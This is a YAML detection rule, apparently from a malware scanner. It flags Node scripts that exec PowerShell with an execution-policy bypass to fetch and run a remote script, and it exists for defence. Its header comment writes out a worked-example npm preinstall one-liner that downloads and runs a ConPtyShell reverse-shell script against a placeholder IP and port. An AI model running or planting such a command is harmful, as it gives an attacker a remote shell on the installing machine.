# A Node script that hands the actual work to PowerShell.
#
# The PowerShell download-execute rules in this directory are `for:
# [powershell]`, so they read a `.ps1`. Here the one-liner is a string inside a
# `.js` file handed to `child_process.exec`, and nothing PowerShell-typed is
# ever analysed -- the carrier is JavaScript even though the payload is not.
#
# `-ExecutionPolicy Bypass` is the tell. It exists to defeat the machine's own
# script policy, and a published Node package has no business turning that off
# on the machine installing it. Paired with a remote script URL and a shell
# call, the sequence is fetch-and-run against a control the operator does not
# own.
#
# Worked example: an npm `preinstall` that execs `powershell -NoProfile
# -ExecutionPolicy Bypass -Command "IEX(IWR <raw.githubusercontent.com path to
# Invoke-ConPtyShell.ps1>); Invoke-ConPtyShell <ip> <port>"`.
defaults:
  platforms: [windows]
  for: [javascript, typescript]
  attack: T1059.001,T1105
  mbc: E1105

composite_rules:
  - id: node-exec-powershell-remote-script
    desc: Node exec runs PowerShell fetching remote script
    crit: hostile
    conf: 0.97
    all:
      - id: micro-behaviors/process/create/shell/bridge::js-exec
      - id: micro-behaviors/process/create/flags::powershell-policy-bypass-argument
    any:
      - id: micro-behaviors/communications/http/url/github::raw-githubusercontent-script-file
      - id: micro-behaviors/communications/http/url/domain::js-remote-host-url
